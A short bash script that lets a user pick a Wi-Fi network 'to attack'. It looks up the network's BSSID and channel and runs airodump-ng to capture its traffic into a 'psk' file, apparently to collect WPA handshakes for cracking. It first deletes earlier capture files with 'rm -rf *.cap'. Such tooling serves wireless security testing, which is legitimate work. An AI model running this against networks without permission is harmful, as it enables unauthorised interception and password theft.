#!/bin/bash

#cat targetList.txt | awk '{print "BSSD: "$1 "\nChannel: "$6 "\nCrypto: "$8 "\nSSID: "$11}'
rm -rf *.cap

echo "Choose which network to attack."
cat network-list.txt

read -r input

#cat network-list.txt | awk -F":" 'BEGIN{print $i}' i="${input}"
ssid=$(awk -v pat="$input" -F ":" '$0~pat{print $2}' network-list.txt)

awk -v pat="$ssid" -F" " '$0~pat{print $2" "$3}' networks.txt > combined.txt
#targetChannel=$(awk -v pat="$ssid" -F" " '$0~pat{print $3}' networks.txt)
#$(awk -v pat="$ssid" -F" " '$0~pat{print $4}' networks.txt)> targetChannel.txt
interface=$(cat interfaceToUse.txt)
#echo $targetBSSID
#echo $targetChannel
#cat combined.txt
targetChannel=$(awk -F " " 'FNR<2{print $2}' combined.txt)
targetBSSID=$(awk -F " " 'FNR<2{print $1}' combined.txt)

airodump-ng -c $targetChannel --bssid $targetBSSID -w psk $interface
